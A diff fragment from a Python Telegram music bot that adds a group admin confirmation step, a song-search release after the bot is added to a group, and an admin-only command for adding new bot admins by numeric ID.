                     row=next((x for x in rows if str(x.get("chat_id"))==str(chat.id)),None)
                     if row:
                         row["intro_sent"] = True
                         _save_destinations(rows)
+            # A new group gets one owner/admin confirmation request.
+            if is_new and ctype in {"group","supergroup"} and new_status in {"administrator","creator"}:
+                _request_primary_admin_for_group(chat)
+            # Search Song group gate: the same search is released automatically
+            # when the user who initiated Add Group has successfully added the bot.
+            if ctype in {"group","supergroup"} and actor_id:
+                pending_song=song_group_gate_pending.pop(actor_id,None)
+                if pending_song:
+                    token=str(pending_song.get("token") or "")
+                    pdata=song_search_pending.get(token)
+                    if pdata and str(pdata.get("uid"))==actor_id and pdata.get("results"):
+                        try: bot.send_message(actor_id,"✅ <b>Group verified.</b> Your saved Search Song is ready.",parse_mode="HTML")
+                        except Exception: pass
+                        _send_song_results(actor_id,token,0)
         elif new_status in {"left","kicked"}:
             _remove_destination(chat.id)
     except Exception as e:
@@ -6127,6 +6319,24 @@ def confirm_join(call):
             bot.answer_callback_query(call.id, "❌ You must join the channel first!", show_alert=True)
     except:
         bot.answer_callback_query(call.id, "❌ Please join the channel first!", show_alert=True)
+
+@bot.message_handler(func=lambda m: m.text == "➕ ADD NEW ADMIN")
+def admin_add_new_admin_start(m):
+    if not is_admin(m.from_user.id): return
+    msg=bot.send_message(m.chat.id,
+        "➕ <b>ADD NEW ADMIN</b>\n\nSend the Telegram numeric ID of the user you want to add as a bot admin.",
+        parse_mode="HTML")
+    bot.register_next_step_handler(msg,admin_add_new_admin_step)
+
+def admin_add_new_admin_step(m):
+    if not is_admin(m.from_user.id): return
+    raw=str(m.text or "").strip().replace("@","")
+    if not raw.isdigit():
+        bot.send_message(m.chat.id,"❌ Please send a numeric Telegram ID.",reply_markup=admin_menu()); return
+    new_id=int(raw)
+    ids=get_admin_ids()
+    if new_id not in ids: ids.append(new_id); save_admin_ids(ids)
+    bot.send_message(m.chat.id,f"✅ <b>Admin added</b>\n\nID: <code>{new_id}</code>",parse_mode="HTML",reply_markup=admin_menu())
 
 @bot.message_handler(func=lambda m: m.text in ["🟢 Open song in bot", "🟢 OPEN SONG IN BOT"])
 def admin_open_song(m):
